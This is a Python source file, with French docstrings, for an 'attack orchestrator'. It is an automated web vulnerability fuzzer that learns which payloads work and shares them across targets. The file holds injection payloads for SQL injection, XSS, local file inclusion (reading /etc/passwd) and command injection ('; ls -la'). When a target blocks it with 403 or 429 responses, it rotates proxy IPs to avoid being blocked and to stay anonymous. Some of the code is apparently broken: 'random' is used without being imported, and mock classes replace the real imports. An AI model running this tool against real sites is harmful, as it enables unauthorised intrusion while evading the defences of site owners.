# orchestrator/attack_orchestrator.py

import asyncio
import httpx
import logging
from typing import Dict, Any, List, Optional, Tuple
import numpy as np # Used for neuron_weights_avg in stats

# Import necessary components from other modules
from src.anonymity.ip_rotator import IpRotator
from src.hebbian_learning.hebbian_network import HebbianNetwork
from src.hebbian_learning.central_memory import CentralMemory
from src.hebbian_learning.feedback_interpreter import FeedbackInterpreter
from src.vulnerabilities.payloads import get_initial_payloads # This function should exist in src/vulnerabilities/payloads.py

logger = logging.getLogger(__name__)

class AttackOrchestrator:
    """
    Coordonne le processus d'attaque pour une cible donnée.
    Il gère la sélection des Hebbian Learning Networks (HLN), l'envoi des requêtes HTTP,
    l'interprétation des réponses et la gestion de la mémoire centrale.
    """
    def __init__(self, ip_rotator: IpRotator, central_memory: CentralMemory):
        """
        Initialise l'Orchestrateur d'Attaques.

        Args:
            ip_rotator (IpRotator): Instance du rotateur d'IP pour gérer l'anonymat.
            central_memory (CentralMemory): Instance de la mémoire centrale pour le cross-learning.
        """
        self.ip_rotator = ip_rotator
        self.central_memory = central_memory
        self.hebbian_networks: Dict[int, HebbianNetwork] = {} # {endpoint_hash: HebbianNetwork instance}
        self.feedback_interpreter = FeedbackInterpreter()
        self.results: List[Dict[str, Any]] = [] # Store detected vulnerabilities
        logger.info("AttackOrchestrator initialized.")

    async def _get_client(self) -> httpx.AsyncClient:
        """
        Obtient un client HTTP asynchrone, potentiellement configuré avec un proxy.

        Returns:
            httpx.AsyncClient: Un client HTTP asynchrone.
        """
        proxy = self.ip_rotator.get_current_proxy()
        if proxy:
            logger.debug(f"Using proxy: {proxy}")
            return httpx.AsyncClient(proxies={"http://": proxy, "https://": proxy}, follow_redirects=True, timeout=20)
        logger.debug("No proxy used.")
        return httpx.AsyncClient(follow_redirects=True, timeout=20)

    async def _send_request(self, url: str, method: str = "GET", params: Optional[Dict[str, str]] = None, 
                           data: Optional[Dict[str, str]] = None, headers: Optional[Dict[str, str]] = None) -> Optional[httpx.Response]:
        """
        Envoie une requête HTTP à l'URL spécifiée.

        Args:
            url (str): L'URL cible.
            method (str): La méthode HTTP ('GET' ou 'POST').
            params (Optional[Dict[str, str]]): Paramètres pour les requêtes GET.
            data (Optional[Dict[str, str]]): Données pour les requêtes POST.
            headers (Optional[Dict[str, str]]): En-têtes HTTP.

        Returns:
            Optional[httpx.Response]: L'objet réponse HTTP ou None en cas d'erreur irrécupérable.
        """
        try:
            async with self._get_client() as client:
                if method.upper() == "GET":
                    response = await client.get(url, params=params, headers=headers)
                elif method.upper() == "POST":
                    response = await client.post(url, data=data, headers=headers)
                else:
                    logger.warning(f"Unsupported method: {method} for {url}")
                    return None
                
                # Check for client or server errors that might indicate blocking or an issue
                response.raise_for_status() 
                return response
        except httpx.HTTPStatusError as e:
            clean = e.response.text[:100].replace('\n', ' ')
            logger.warning(f"HTTP error for {url} ({method}): {e.response.status_code} - {clean}...")
            # Common blocking/error codes: 403 Forbidden, 429 Too Many Requests, 500 Internal Server Error
            if e.response.status_code in [403, 429]: 
                logger.warning(f"Detected potential block for {url}. Rotating IP.")
                await self.ip_rotator.rotate_ip()
            # Return response even on HTTP status error, as feedback interpreter might use it (e.g., SQL errors in 500 responses)
            return e.response 
        except httpx.RequestError as e:
            logger.error(f"Request error for {url} ({method}): {e}")
            await self.ip_rotator.rotate_ip() # Rotate IP on network errors (DNS, connection failed, timeout)
            return None
        except Exception as e:
            logger.error(f"An unexpected error occurred sending request to {url}: {e}", exc_info=True)
            return None

    async def test_endpoint(self, endpoint_details: Dict[str, Any], vulnerability_type: str, iterations: int = 10):
        """
        Teste un point d'extrémité donné pour un type de vulnérabilité spécifique
        en utilisant un Hebbian Learning Network dédié.

        Args:
            endpoint_details (Dict[str, Any]): Détails du point d'extrémité (URL, méthode, paramètres).
            vulnerability_type (str): Le type de vulnérabilité à tester (ex: 'SQLi', 'XSS').
            iterations (int): Le nombre d'itérations de test (générations de payloads).
        """
        url = endpoint_details.get('url')
        method = endpoint_details.get('method')
        params = endpoint_details.get('params', []) # List of {'name': 'val', 'type': 'text'}

        if not url or not method:
            logger.error(f"Invalid endpoint details: Missing URL or Method. Details: {endpoint_details}")
            return

        # Create a unique hash for the endpoint to manage its dedicated HLN
        # Using frozenset for params to make it hashable
        endpoint_id_tuple = (url, method, frozenset((p['name'], p.get('type'), p.get('value')) for p in params))
        endpoint_hash = hash(endpoint_id_tuple)

        if endpoint_hash not in self.hebbian_networks:
            logger.info(f"Initializing Hebbian Network for new endpoint: {url} ({vulnerability_type})")
            # Get initial payloads for this vulnerability type, possibly generalized from central memory
            # For the first iteration, we use pre-defined initial payloads.
            # In future iterations, we could query CentralMemory.get_generalized_patterns()
            # to prime the HLN with patterns successful on *other* similar endpoints.
            initial_payloads_for_hln = get_initial_payloads(vulnerability_type) # From src/vulnerabilities/payloads.py
            
            # Optionally, combine with generalized patterns from CentralMemory if available for cross-learning
            # For simplicity, this example only uses initial_payloads for HLN initialization
            # A more advanced design would pass target_tech_profile to get_generalized_patterns
            generalized_patterns = self.central_memory.get_generalized_patterns(vulnerability_type, target_tech_profile=endpoint_details.get('tech_profile'))
            if generalized_patterns:
                # Add generalized patterns to the initial pool for this HLN, without duplicates
                initial_payloads_for_hln.extend([p for p in generalized_patterns if p not in initial_payloads_for_hln])
                logger.debug(f"Added {len(generalized_patterns)} generalized patterns to HLN for {url}.")

            if not initial_payloads_for_hln:
                logger.warning(f"No initial or generalized payloads for {vulnerability_type}. Skipping {url}.")
                return

            self.hebbian_networks[endpoint_hash] = HebbianNetwork(endpoint_details, initial_payloads_for_hln)
            logger.info(f"Hebbian Network initialized for {url} ({vulnerability_type}) with {len(initial_payloads_for_hln)} initial patterns.")
            
        current_hln = self.hebbian_networks[endpoint_hash]
        last_payload: Optional[str] = None
        last_feedback: Optional[str] = None # String representation for HebbianNetwork.generate_payload

        for i in range(iterations):
            logger.debug(f"Iteration {i+1}/{iterations} for {url} ({vulnerability_type}).")
            payload = current_hln.generate_payload(last_payload, last_feedback)
            
            request_params: Dict[str, str] = {}
            request_data: Dict[str, str] = {}
            target_param_name: Optional[str] = None

            # Heuristic to find a parameter to inject the payload into
            # Prioritize text-based inputs, then any parameter
            for p in params:
                if p.get('type') == 'text' or p.get('name'): # Ensure 'name' exists
                    target_param_name = p['name']
                    break
            
            if not target_param_name and params: # Fallback to the first parameter if no suitable one found
                target_param_name = params[0]['name']

            response: Optional[httpx.Response] = None
            if target_param_name:
                # Populate parameters/data with payload and existing values
                for p in params:
                    if method.upper() == "GET":
                        request_params[p['name']] = payload if p['name'] == target_param_name else p.get('value', '')
                    elif method.upper() == "POST":
                        request_data[p['name']] = payload if p['name'] == target_param_name else p.get('value', '')

                if method.upper() == "GET":
                    response = await self._send_request(url, method="GET", params=request_params)
                elif method.upper() == "POST":
                    response = await self._send_request(url, method="POST", data=request_data)
                else:
                    logger.warning(f"Unsupported method {method} for endpoint {url}. Skipping request.")
            else:
                logger.warning(f"No suitable parameter found for injection on {url}. Skipping payload testing for this iteration.")

            if response:
                # Interpret the response to get feedback signal and proof
                feedback_signal_int, proof = self.feedback_interpreter.interpret_response(
                    vulnerability_type, response, payload
                )
                
                if feedback_signal_int == 1: # Vulnerability detected (positive feedback)
                    logger.critical(f"VULNERABILITY DETECTED! Type: {vulnerability_type}, URL: {url}, Payload: {payload}, Proof: {proof}")
                    
                    # Determine criticality, explanation, recommendations based on vulnerability type
                    criticality = "HIGH" # Default high for most critical web vulnerabilities
                    explanation = f"Detected {vulnerability_type} vulnerability at {url} with payload '{payload}'. Proof: {proof or 'N/A'}"
                    recommendations = f"Consult OWASP Top 10 guidelines for {vulnerability_type} mitigation. General advice: Implement robust input validation and sanitization, use parameterized queries, ensure proper output encoding, and apply security headers."

                    # Store the finding
                    self.results.append({
                        'url': url,
                        'method': method,
                        'vulnerability_type': vulnerability_type,
                        'payload': payload,
                        'criticality': criticality,
                        'proof': proof,
                        'explanation': explanation,
                        'recommendations': recommendations
                    })
                    
                    # Provide positive feedback to the Hebbian Network
                    current_hln.provide_feedback(payload, 1) 
                    last_feedback = "SUCCESS"
                    
                    # Add successful pattern to central memory for cross-learning
                    self.central_memory.add_successful_pattern(vulnerability_type, payload, endpoint_details)
                    
                    # Option: break after first finding or continue to find more PoCs for the same vulnerability
                    # For a fuzzer, it's often useful to continue. For a quick scan, breaking is fine.
                    # For this demo, let's break if a critical vuln is found.
                    if criticality in ["CRITICAL", "HIGH"]: 
                        logger.info(f"Stopping testing for {url} after finding {vulnerability_type}.")
                        break 

                else: # No vulnerability detected (negative or neutral feedback)
                    logger.info(f"Payload '{payload}' on {url} - No vulnerability detected. Status: {response.status_code}")
                    current_hln.provide_feedback(payload, feedback_signal_int) # Pass the actual signal (-1 or 0)
                    last_feedback = "FAILURE" if feedback_signal_int == -1 else "NEUTRAL"
            else:
                # If no response was received (e.g., network error), provide neutral feedback
                logger.warning(f"No response received for {url} with payload '{payload}'. Providing neutral feedback to HLN.")
                current_hln.provide_feedback(payload, 0) 
                last_feedback = "NEUTRAL"
            
            last_payload = payload # Set current payload as last for next iteration
            await asyncio.sleep(0.5) # Small delay to avoid overwhelming the server

        logger.info(f"Finished testing {url} for {vulnerability_type} after {i+1} iterations.")

    def get_scan_results(self) -> List[Dict[str, Any]]:
        """
        Retourne les résultats de l'analyse collectés.

        Returns:
            List[Dict[str, Any]]: Une liste de dictionnaires décrivant les vulnérabilités trouvées.
        """
        return self.results
        
    def get_hebbian_network_stats(self) -> Dict[int, Dict[str, Any]]:
        """
        Retourne des statistiques sur les réseaux Hebbien actifs.

        Returns:
            Dict[int, Dict[str, Any]]: Un dictionnaire de statistiques par hachage de point d'extrémité.
        """
        stats: Dict[int, Dict[str, Any]] = {}
        for ep_hash, hln in self.hebbian_networks.items():
            # Calculate average neuron weights, handling potential empty neuron list
            avg_weights = np.mean([np.mean(n.weights) for n in hln.neurons]) if hln.neurons else 0.0
            
            stats[ep_hash] = {
                'url': hln.target_endpoint_context.get('url'),
                'method': hln.target_endpoint_context.get('method'),
                'vulnerability_type': hln.target_endpoint_context.get('vulnerability_type', 'N/A'), # Assuming this might be stored in context
                'successful_patterns_count': len(hln.get_successful_patterns()),
                'neuron_weights_avg': avg_weights
            }
        return stats

# Example Usage (for testing the orchestrator functionality)
import asyncio

# --- MOCK CLASSES/FUNCTIONS FOR DEMO ---
# In a real scenario, these would be imported from their actual locations:
# src.anonymity.ip_rotator
# src.hebbian_learning.central_memory
# src.hebbian_learning.feedback_interpreter
# src.vulnerabilities.payloads

class DummyIpRotator:
    def __init__(self):
        self._current_proxy = None
        self._proxy_type = "Direct"
    def get_current_proxy(self): return self._current_proxy
    def get_proxy_type(self): return self._proxy_type
    async def rotate_ip(self): 
        print("IP rotation triggered (Dummy).")
        # Simulate changing proxy (e.g., to next in a list, or None)
        self._current_proxy = "http://mock_proxy:8080" if self._current_proxy is None else None

# Re-using CentralMemory, FeedbackInterpreter, get_initial_payloads from hebbian_learning examples
# For this orchestrator demo, we need them here if running `attack_orchestrator.py` directly.
# In a full system, you would delete these mocks and rely on the imports.
class CentralMemory:
    def __init__(self):
        self.successful_patterns_db = {} # {vuln_type: {payload_hash: {'payload': '...', 'contexts': [...]}}}
    def add_successful_pattern(self, vulnerability_type, payload, endpoint_context):
        if vulnerability_type not in self.successful_patterns_db:
            self.successful_patterns_db[vulnerability_type] = {}
        payload_hash = hash(payload)
        if payload_hash not in self.successful_patterns_db[vulnerability_type]:
            self.successful_patterns_db[vulnerability_type][payload_hash] = {'payload': payload, 'contexts': []}
        if endpoint_context not in self.successful_patterns_db[vulnerability_type][payload_hash]['contexts']:
            self.successful_patterns_db[vulnerability_type][payload_hash]['contexts'].append(endpoint_context)
        logger.info(f"Mock Central Memory: Added successful pattern '{payload}' for {vulnerability_type}.")
    def get_generalized_patterns(self, vulnerability_type, target_tech_profile=None):
        # A very basic mock for generalization
        patterns = set()
        if vulnerability_type in self.successful_patterns_db:
            for payload_data in self.successful_patterns_db[vulnerability_type].values():
                patterns.add(payload_data['payload'])
        return list(patterns)

class FeedbackInterpreter:
    def interpret_response(self, vulnerability_type: str, response: Any, payload: str) -> Tuple[int, Optional[str]]:
        # Mock interpretation:
        # Simulate success based on specific keywords or payload reflection
        if response is None:
            return -1, "No response received (mock)."
        
        response_text = response.text.lower()
        status_code = response.status_code

        # Basic XSS check: reflection of script payload in 200 OK
        if vulnerability_type == "XSS" and '<script>alert(1)</script>' in payload and payload.lower() in response_text and status_code == 200:
            return 1, f"Mock XSS: Payload reflected. Status {status_code}"
        
        # Basic SQLi check: specific error message or 500 status with general error
        if vulnerability_type == "SQLi":
            if "sql syntax" in response_text or "mysql" in response_text or "fatal error" in response_text and status_code in [200, 500]:
                return 1, f"Mock SQLi: SQL error keyword found. Status {status_code}"
            # Simulate time-based if sleep(5) is in payload and response took long
            if "sleep(5)" in payload and response.elapsed.total_seconds() > 4.5: # Needs httpx.Response.elapsed
                 return 1, f"Mock SQLi: Simulated time-based detected (long response). Status {status_code}"

        # Basic LFI check: /etc/passwd content
        if vulnerability_type == "LFI" and "/etc/passwd" in payload and "root:x:0:0:" in response_text and status_code == 200:
            return 1, f"Mock LFI: /etc/passwd content found. Status {status_code}"
        
        # Simulate a generic error leading to failure feedback
        if status_code >= 400:
            return -1, f"Mock Error: HTTP Status {status_code}"

        # Default to failure
        return -1, "Mock: No vulnerability detected."

# This function would be imported from src/vulnerabilities/payloads.py
def get_initial_payloads(vulnerability_type: str) -> List[str]:
    """Provides initial payload patterns for a given vulnerability type."""
    payloads = {
        'XSS': [
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>"
        ],
        'SQLi': [
            "' OR 1=1 --",
            "' UNION SELECT 1,2,3--",
            "admin'--",
            "sleep(5)--" # For time-based check
        ],
        'LFI': [
            "../../../../etc/passwd",
            "/proc/self/cmdline"
        ],
        'RCE': [
            "; ls -la",
            "| id"
        ]
    }
    return payloads.get(vulnerability_type, ["<default_test_payload>"])

# --- END MOCK CLASSES/FUNCTIONS ---

async def test_attack_orchestrator():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    # Set httpx logging to warning to avoid verbosity from internal client operations
    logging.getLogger("httpx").setLevel(logging.WARNING) 
    logger.setLevel(logging.DEBUG) # Set orchestrator's logger to DEBUG for more detail

    ip_rotator = DummyIpRotator()
    central_memory = CentralMemory()
    orchestrator = AttackOrchestrator(ip_rotator, central_memory)

    # Define some mock endpoints. For real testing, these would be actual URLs.
    # We will simulate responses for these.
    demo_endpoint_sqli = {
        'url': 'http://mock-vulnerable-app.com/products', 
        'method': 'GET',
        'params': [{'name': 'id', 'type': 'text', 'value': '1'}],
        'tech_profile': {'PHP', 'MySQL'}
    }

    demo_endpoint_xss = {
        'url': 'http://mock-vulnerable-app.com/search',
        'method': 'GET',
        'params': [{'name': 'query', 'type': 'text', 'value': 'test'}],
        'tech_profile': {'React', 'NodeJS'}
    }

    # Simulate a response for a specific payload for demo purposes in FeedbackInterpreter
    # This is highly simplified and would be done by the actual web requests
    # Mock httpx.Response object with elapsed attribute for time-based checks
    class ExtendedMockResponse(httpx.Response):
        def __init__(self, status_code, content, request=None, headers=None, elapsed_seconds=0.1):
            super().__init__(status_code, content=content, request=request, headers=headers)
            self._elapsed = asyncio.create_task(asyncio.sleep(elapsed_seconds)) # Simulate async elapsed
            self.elapsed = type('', (), {'total_seconds': lambda: elapsed_seconds})() # Mock elapsed property

    # Override _send_request for the demo to return mock responses
    async def mock_send_request(self, url, method="GET", params=None, data=None, headers=None):
        payload_in_request = None
        if params and 'id' in params: payload_in_request = params['id']
        elif params and 'query' in params: payload_in_request = params['query']
        elif data and 'id' in data: payload_in_request = data['id']
        elif data and 'query' in data: payload_in_request = data['query']

        if "products" in url and "OR 1=1" in str(payload_in_request):
            return ExtendedMockResponse(200, b"Product list. SQL syntax error near 'OR 1=1'", elapsed_seconds=0.05)
        if "products" in url and "sleep(5)" in str(payload_in_request):
            return ExtendedMockResponse(200, b"Processing...", elapsed_seconds=5.5) # Simulate time delay
        if "search" in url and "<script>alert(1)</script>" in str(payload_in_request):
            return ExtendedMockResponse(200, f"Search results for: {payload_in_request} <script>alert(1)</script>".encode(), elapsed_seconds=0.05)
        
        # Simulate a 403 Forbidden for a random request
        if random.random() < 0.2: # 20% chance of a 403
            return ExtendedMockResponse(403, b"Forbidden", elapsed_seconds=0.05)

        return ExtendedMockResponse(200, b"Default healthy response.", elapsed_seconds=0.05)

    # Temporarily replace the orchestrator's _send_request with our mock
    orchestrator._send_request = mock_send_request.__get__(orchestrator, AttackOrchestrator)

    print("\n--- Testing SQLi on demo endpoint ---")
    await orchestrator.test_endpoint(demo_endpoint_sqli, 'SQLi', iterations=5)

    print("\n--- Testing XSS on demo endpoint ---")
    await orchestrator.test_endpoint(demo_endpoint_xss, 'XSS', iterations=5)

    print("\n--- Scan Results ---")
    results = orchestrator.get_scan_results()
    if results:
        for res in results:
            print(f"[{res['criticality']}] {res['vulnerability_type']} at {res['url']} with payload: {res['payload']}")
            print(f"  Proof: {res['proof']}")
            print(f"  Explanation: {res['explanation']}")
            print(f"  Recommendations: {res['recommendations']}\n")
    else:
        print("No vulnerabilities detected in this simulation.")
    
    print("\n--- Hebbian Network Stats ---")
    hln_stats = orchestrator.get_hebbian_network_stats()
    for ep_hash, stats in hln_stats.items():
        print(f"Endpoint URL: {stats['url']}, Method: {stats['method']}")
        print(f"  Successful patterns for this HLN: {stats['successful_patterns_count']}")
        print(f"  Avg Neuron Weights: {stats['neuron_weights_avg']:.4f}")

if __name__ == "__main__":
    asyncio.run(test_attack_orchestrator())
